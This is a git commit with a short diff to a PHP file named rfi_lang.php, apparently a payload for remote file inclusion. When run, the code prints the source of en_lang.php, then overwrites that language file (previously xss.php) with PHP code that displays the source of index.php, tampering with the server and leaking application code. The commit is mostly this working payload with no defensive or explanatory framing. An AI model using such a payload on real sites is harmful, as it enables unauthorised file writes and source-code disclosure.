72f78c5d8117172e7431b3391df280a771edee34
Bun suwanparsert <bun.swp@gmail.com>
2016-10-11 11:36:25 +0700

    Update rfi_lang.php

--- rfi_lang.php
+++ rfi_lang.php
@@ -2,7 +2,7 @@
   echo "Edited"; 
   show_source('en_lang.php');
 
-  $myfile = fopen("xss.php", "w") or die("Unable to open file!");
+  $myfile = fopen("en_lang.php", "w") or die("Unable to open file!");
   $txt = "<?php show_source('index.php'); ?>";
   fwrite($myfile, $txt);
   fclose($myfile);
